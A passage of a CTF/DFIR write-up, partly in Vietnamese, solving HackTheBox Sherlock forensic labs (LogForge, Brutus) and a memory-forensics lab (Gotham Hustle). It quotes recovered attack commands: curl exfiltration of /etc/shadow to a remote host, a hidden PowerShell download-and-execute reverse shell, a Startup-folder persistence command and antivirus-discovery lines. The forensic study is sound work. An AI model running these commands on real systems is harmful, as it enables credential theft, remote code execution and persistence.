result = (base64.b64decode(reverse_str)).decode('utf-8')
print(result)
```
Ta được output:
```
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php
```
**$\rightarrow$ Đáp án: `base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php`**

### V. LogForge:
> - Link lab: https://app.hackthebox.com/sherlocks/LogForge?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/By95BIhAWe.png)
> - File được cho:
> ![image](https://hackmd.io/_uploads/rkCmd830Wx.png)
> - Timezone:
> ![image](https://hackmd.io/_uploads/Skr0pI30Wg.png)

#### 1. When was the user's last successful login to the system?
- Extract the `SAM` hive by using FTK Imager and go to `C:\Windows\System32\Config`.
- Using Registry Explorer and going to `SAM\Domains\Account\Users` to find the last time when the user successfuly login to the system:
![image](https://hackmd.io/_uploads/Hki-D62Rbg.png)
But `2025-08-11 06:46:52` is not the correct answer.
- Extract `C:\Windows\System32\winevt\Logs\Security.evtx` in FTK Imager, then use `EvtxECmd.exe` to analyse the `Security.evtx` by using CMD:
    ``` cmd
    "C:\Users\[Users]\Downloads\EvtxECmd\EvtxeCmd\EvtxECmd.exe" -f "C:\Users\[Users]\Desktop\Security.evtx" --csv "C:\Users\[Users]\Desktop" --csvf "Analyzed_Security.csv"
    ```
- Open `Analyzed_Security.csv` and filter Event ID `4624`, then find the lastest event:
![image](https://hackmd.io/_uploads/r1_nu6n0Wg.png)

The answer: `2025-08-11 06:57:11`

#### 2. When did the victim last open the browser they regularly used on the system
Extracting `NTUSER.DAT` in `C:\Users\user\` by using FTK Imager. Then using Registry Explorer to analyse and going to `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`.
![image](https://hackmd.io/_uploads/HJdzCpnCWx.png)
The answer: `2025-08-11 07:12:17`

#### 3. The user accessed a malicious website as a result of phishing attempt. What is the URL?
Using FTK Imager to extract the file `C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Default\History`. Then access `https://inloop.github.io/sqlite-viewer/` and upload the file `History`. Execute the query command `SELECT * FROM 'urls'`:
![image](https://hackmd.io/_uploads/HkIN6R3A-g.png)
Perhaps `https://cool-bunny-55393d.netlify.app/` is the supecious link. And it's the correct answer.
> I think this is the sign of phishing attempt:
![image](https://hackmd.io/_uploads/S17NCChC-g.png)

#### 4. After the user visited the website, they were directed to copy a command from the website and enter it into the File Explorer search bar. Shortly after, strange behavior was noticed. What is the full URL that installed the reverse shell on the victim's device?
To find the command entered into the File Explorer search bar, using Registry Explorer and going to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`:
![image](https://hackmd.io/_uploads/HyK671pC-g.png)
We can see the reverse shell command, and the answer is `http://192.168.26.128:8000/rev.ps1`.
> The reverse shell command:
> ``` powershell
> powershell -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(''http://192.168.26.128:8000/rev.ps1'')'" #                     chrome.exe --update --fix --hash="1e693edc-bcc1-4503-b898-7c0b2899d03c"
> ```

#### 5. This attack preys on non-technical users by luring them into traps and manipulating them into unknowingly executing commands on the system. Based on the analysis of the previously identified command, what is this type of attack called?
The answer is`FileFix`, a variant of ClickFix.
> More information of ClickFix Attack: [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)

#### 6. After the attack, the user noticed that Notepad had opened with a message left by the attacker. What is the email address of the attacker?
- Export `$MFT` by using FTK Imager and analyse in Command Prompt with command:
    ``` cmd
    "C:\Users\Ha Nguyen\Downloads\MFTECmd\MFTECmd.exe" -f "C:\Users\Ha Nguyen\Desktop\$MFT" --csv "C:\Users\Ha Nguyen\Desktop" --csvf "MFT_Parsed.csv" --dr
    ```
    ![image](https://hackmd.io/_uploads/HyTOIt3yGl.png)
    > `--dr` (Drive letter remapping/Delete/Re-create): To analyse special records or overwrite/delete old files automatically if files with the same name are existing in the export folder.
- In the output folder `Resident`, there is a file having the name `93420-8-1_README.txt.bin`, check the data of this file:
![image](https://hackmd.io/_uploads/rJLjdYhJfe.png)
The answer: `0xSh3rl0cK@protonmail.com

#### 7. The attacker downloaded malware to infect the victim's device. What is the full path of the malicious malware file.
- When an app run, a prefetch fill will be created. Using FTK Imager, going to `Windows\prefetch\` and exporting this folder. Then opening CMD:
``` cmd
PECmd.exe -d "C:\Users\Ha Nguyen\Desktop\prefetch" --csv "C:\Users\Ha Nguyen\Desktop" --csvf "Intranet_Prefetch_Parsed.csv"
```
- Using Timeline Explorer to analyse `Intranet_Prefetch_Parsed_Timeline.csv`. We will find the suspecious file having the timeline after `2025-08-11 07:12:17`:
![image](https://hackmd.io/_uploads/BkWyDlCyzg.png)
The answer: `C:\Windows\Temp\WindowsUpdate.exe`

#### 8. What is the product name of this malicious file
- Using FTK Imager to go to `C/Windows/System32/winevt/logs` and export `Microsoft-Windows-Sysmon%4Operational`.
![image](https://hackmd.io/_uploads/rkxmzeSbzg.png)
- Open this file in Event Viewer, then filter processes that have the Event ID `1` and find the process of `C:\Windows\Temp\WindowsUpdate.exe`:
![image](https://hackmd.io/_uploads/SyZZ7gS-zl.png)
The answer: `Virtuoso`

#### 9. The malware created several directories on the system. Under which path were these files created?
Filtering Event ID 11 (FileCreate), we can see that there are several directories created in `C:\Windows\`:
![image](https://hackmd.io/_uploads/SkH92eBWMx.png)
![image](https://hackmd.io/_uploads/SJdo2xrbGe.png)
![image](https://hackmd.io/_uploads/rylphlrWfg.png)
![image](https://hackmd.io/_uploads/SkApneS-fg.png)
![image](https://hackmd.io/_uploads/HycRnlrZfx.png

#### 10. A script file was staged on the machine by the malware. What is the full command used to achieve this
- Execute the command below in CMD to extract `.csv` file:
![image](https://hackmd.io/_uploads/HJmbN-rWGe.png)
- Open this file, then filter to find the process that have Event ID `1` and Parent Process `WindowsUpdate.exe`:
![image](https://hackmd.io/_uploads/SyEiEWHWMg.png)
`"C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat &amp; Cricket.bat` is the wrong answer, but when I went back to Event Viewer, at the detail of the event located above the event of `WindowsUpdate.exe`, I found this:
![image](https://hackmd.io/_uploads/BJ62H-S-Mx.png)
The answer: `"C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat & Cricket.bat

#### 11. What is the full path of the staged script file?
The script file needed to find is `Cricket.bat`. Filter the process that have Event ID `11`:
![image](https://hackmd.io/_uploads/S1eDURHIbfl.png)
The answer: `C:\Users\user\AppData\Local\Temp\Cricket.bat`

#### 12. The attacker dropped an automation utility on the system with a legacy file format. What is the full path of this newly dropped file?
At the event above the event in Task 11:
![image](https://hackmd.io/_uploads/Sy8eyLL-fg.png)
When we filter the process having Event ID `1`:
![image](https://hackmd.io/_uploads/S1dHxUIbfg.png)
The answer is `C:\Users\user\AppData\Local\Temp\316094\Intranet.pif`.
> `.pif` - Program Information File: The file that contain the program information of MS-DOS programs.

#### 13. What is the name and version of the utility?
In Event Viewer, filter the process having Event ID `1`:
![image](https://hackmd.io/_uploads/r1BwzIUWGl.png)
Explain the above information:
- Description: `AutoIt v3 Script`
- Product: `AutoIt v3 Script`
- Company: `AutoIt Team`
- Version: `3, 3, 14, 3` or `3.3.14.3`
- Original: `AutoIt3.exe`

I tried with `AutoIt v3 Script 3.3.14.3`, but is was wrong. The answer is `AutoIt 3.3.14.3`.

#### 14. Using this utility, the attacker dropped another script on the system. What is the name of this script?
At the event above the event in Task 13:
![image](https://hackmd.io/_uploads/SkULIULbGg.png)
The answer: `Virtuoso.js`

#### 15. In order to evade defenses for unattended access, the malware executed commands to look for EDR and antivirus presence on the system. What is the full command line of the second command used to achieve this?
I found this:
![image](https://hackmd.io/_uploads/B1pAewIWzg.png)
The answer: `findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth"`
> Explain the command: List all features needed to check in the system:
> - `avastui`: Avast Antivirus UI
> - `avgui`: AVG Antivirus UI
> - `bdservicehost`: Bitdefender Service Process
> - `nswscsvc`: Norton Security/Norton WSC Service
> - `sophoshealth`: Sophos Health Service

#### 16. What is the full command used to set up persistence on the system
At the event in Task 14. The answer:
```
cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit
```
> The above command creates a shortcut (`.url`) in folder `Startup`, access directly to a script file (`.js`). When the system start, this `.js` file will automatically execute.

### VI. Brutus:
> - **Link lab:** https://app.hackthebox.com/sherlocks/Brutus?tab=play_sherlock
> - **Đề bài:** *In this Sherlock, you will familiarize yourself with Unix `auth.log` and `wtmp` logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using `auth.log`. Although `auth.log` is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.*

#### 1. Analyze the `auth.log`. What is the IP address used by the attacker to carry out a brute force attack?
In `auth.log`, we see this following line:
![image](https://hackmd.io/_uploads/H1yLE49WGx.png)
Answer: `65.2.161.68`

#### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
Attacker tried to access to the system by using brute-force attack, we can see this line in `auth.log`:
![image](https://hackmd.io/_uploads/S1Q9B4c-zx.png)
Answer: `root`

#### 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the `wtmp` artifact.
- In `auth.log`, we see this line:
![image](https://hackmd.io/_uploads/BkezKEqZMg.png)
- To parse the file `wtmp`, we have to create file `parse.c` in the folder containing `wtmp`:
``` c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <utmp.h>
#include <time.h>

int main() {
    int fd;
    struct utmp cr;
    int reclen = sizeof(struct utmp);

    fd = open("wtmp", O_RDONLY);
    if (fd == -1) {
        perror("Cannot open file wtmp");
        exit(1);
    }

    printf("%-10s | %-15s | %-20s | %s", "Type", "User", "Host", "Time\n");
    printf("-------------------------------------------------------------------------\n");

    while (read(fd, &cr, reclen) == reclen) {
        if (cr.ut_user[0] != '\0') {
            time_t login_time = cr.ut_tv.tv_sec;
            char *time_str = ctime(&login_time);
            
            if (time_str) {
                time_str[24] = '\0'; 
            }

            printf("%-10d | %-15s | %-20s | %s\n", 
                   cr.ut_type, cr.ut_user, cr.ut_host, time_str);
        }
    }

    close(fd);
    return 0;
}
```
> We can also use the source code `.py` given in `Brutus.zip`:
- We have the following result:
![image](https://hackmd.io/_uploads/rJQd_4c-fx.png)
As we can see, the login time is `2024-03-06 06:32:44` and the authentication time is `2024-03-06 06:32:45`.
Answer: `2024-03-06 06:32:45`

#### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
In `auth.log`:
![image](https://hackmd.io/_uploads/SkDhqEq-fl.png)
Answer: `37`

#### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
We can see this:
![image](https://hackmd.io/_uploads/S1JMjN9WMl.png)
Answer: `cyberjunkie`

#### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
Searching for `MITRE ATT&CK sub-technique ID used for persistence by creating a new account` on Google and I found this title:
![image](https://hackmd.io/_uploads/SkVG24qZMl.png)
> https://attack.mitre.org/techniques/T1136/001/

Answer: `T1136.001`

#### 7. What time did the attacker's first SSH session end according to `auth.log`?
We can see this line:
![image](https://hackmd.io/_uploads/BJTp2EcWfx.png)
Answer: `2024-03-06 06:37:24`

#### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
In `auth.log`, we can see this line:
![image](https://hackmd.io/_uploads/BJzPTEcZfg.png)
Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## DFIR-LAB:
> Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS

### 1. Gotham Hustle:
#### a) Đề bài:
- Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS/tree/main/Gotham%20Hustle
- Đề bài:
![image](https://hackmd.io/_uploads/H1KPgHqbfe.png)
- Handout: https://drive.google.com/file/d/1fwqdgpXkEnZ2xgujGaRufmPht5H_3xrT/view?usp=sharing
> The solution as well as the flag can be found in the same folder, but it's advised to finish all the questions before checking the solution.

#### b) Phân tích cách làm:
- By using Volatility 2, checking the `imageinfo` of `gotham.raw`:
![image](https://hackmd.io/_uploads/HJuyFyaWzg.png)
It is `Win7SP1x64`.
- Check the plugin `pstree`:
![image](https://hackmd.io/_uploads/ryGqF16-zl.png)
I think that `cmd.exe`, `notepad.exe`, `chrome.exe`, `mspaint.exe` is so suspicious.
- Check the plugin `cmdline` and there is no suspect there, then check the plugin `cmdscan`:
![image](https://hackmd.io/_uploads/Hkib2NRWGl.png)
I found a base64 code `Ymkwc2N0Znt3M2xjMG0zXw==`, decode it and we have the first part of the flag `bi0sctf{w3lc0m3_`.
- Check the plugin `chromehistory` and we found another base64 code:
![image](https://hackmd.io/_uploads/Sk4TaECbGx.png)
Decode it, we have the third part of our flag, it is `h0p3_th15_`.
- Dump the process having PID `2516` (`mspaint.exe`), then rename it to `2516.data` and open in GIMP.
![image](https://hackmd.io/_uploads/B1vcYSPQGl.png)
![image](https://hackmd.io/_uploads/BkGoFBPQGe.png)
Maybe our base64 code is `dDBfZGYxcl9sNGI1Xw==`. Decode it and we have `t0_df1r_l4b5_`.
- When I use plugin `filescan` and filter some keywords such as `password`, `flag`, `secret`:
![image](https://hackmd.io/_uploads/BJurwquXGe.png)
Dump and rename this file:
![image](https://hackmd.io/_uploads/BkZ_jc_mzl.png)
Try to unrar this file, and we have to find the computer's password:
![image](https://hackmd.io/_uploads/By2AscdmGg.png)
When using plugin `filescan`, we knew that `bruce` is the user of this computer. Using `hashdump` to get the hash of password:
![image](https://hackmd.io/_uploads/rks8a9dXMg.png)
Using `hashcat` to crack the password:
![image](https://hackmd.io/_uploads/Sk2105dQfg.png)
![image](https://hackmd.io/_uploads/BJje0cdQMl.png)
Our password is `batman`. Extract `flag5.rar`:
![image](https://hackmd.io/_uploads/rkPUAcdmGg.png)
Decode the base64 code and we have `m0r3_13337431}`
- When I dump the process of `notepad.exe`, then filter some keywords like `flag`, `password`, `secret`, `hidden`, I found this:
![image](https://hackmd.io/_uploads/HkJ1miumfg.png)
![image](https://hackmd.io/_uploads/BJRAViOQfx.png)
But I couldn't find this file. I also tried to find by using plugin `filescan` and `mftparser` but there was nothing. We will try another way.
- When I use plugin `screenshot` with `-D .`, I found some images:
![image](https://hackmd.io/_uploads/SyzlQrsmMg.png)
Check for each image, in `session_1.WinSta0.Default.png`:
![session_1.WinSta0.Default](https://hackmd.io/_uploads/B1gCmrsmMx.png)
It means nothing, and all of the rest includes nothing too .-.
- If we type some words in Notepad and don't save it, the data of these words will be saved in heap memory. I will use WinDbg to examine the heap. Firstly, convert raw to crash dump, creating the file that are compatible with WinDbg, by Volatility. Then check the size of file and move it to Windows:
![image](https://hackmd.io/_uploads/SJZfQAJ4fl.png)
![image](https://hackmd.io/_uploads/HJ-ZH0JNMl.png)
![image](https://hackmd.io/_uploads/BkLGrC14Mg.png)
Using WinDbg, open crash dump and find the process by using command `!process 0 0 notepad.exe`:
![image](https://hackmd.io/_uploads/r1AEBCkNzg.png)
![image](https://hackmd.io/_uploads/B1zYURJNMl.png)
Then, set debugger context to this process by using `.process /r /p fffffa8003c9c4f0` and display the summary of heap by `!heap -s`:
![image](https://hackmd.io/_uploads/r1nQvAkEMe.png)
This command lists all the heap in the process, include size, address, segment code. To display the detail, using command `!heap -a`:
![image](https://hackmd.io/_uploads/ry36D0JEfg.png)
This command lists each of heap blocks and its tag (`busy` or `free`). We will looking for `busy`. But in our output, we can see the error `SEGMENT HEAP ERROR: failed to initialize the extention` because the extension `!heap` of WinDbg 10 is not compatible with the heap structure of Windows 7. I tried using command `!heap -s -v -a` and I saw this:
![image](https://hackmd.io/_uploads/rJtWRTmVGg.png)
![image](https://hackmd.io/_uploads/rJFfRTQ4Me.png)
This image below is the reason why we should focus on tag `HEAP_ENTRY_USER_FLAGS`:
![image](https://hackmd.io/_uploads/H1Z8R6mNfx.png)
Extract the content:
![image](https://hackmd.io/_uploads/Hyw9CT7EMl.png)
The base64 code above is `YjNuM2YxNzVfeTB1Xw==`, decode it and we have the final part of our flag: `b3n3f175_y0u_`
> Link to the blog helping me to find the last part of flag: [The Analysis of User Data In VADs: Extraction of Precise Data in Notepad Memory And Hunting For Malware Behavior](https://web.archive.org/web/20250117221105/https://www.sans.org/blog/the-analysis-of-user-data-in-VADs-extraction-of-precise-data-in-notepad-memory-and-hunting-for-malware-behavior/)
- Our flag is `bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}`

#### c) Kết quả
`bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}`
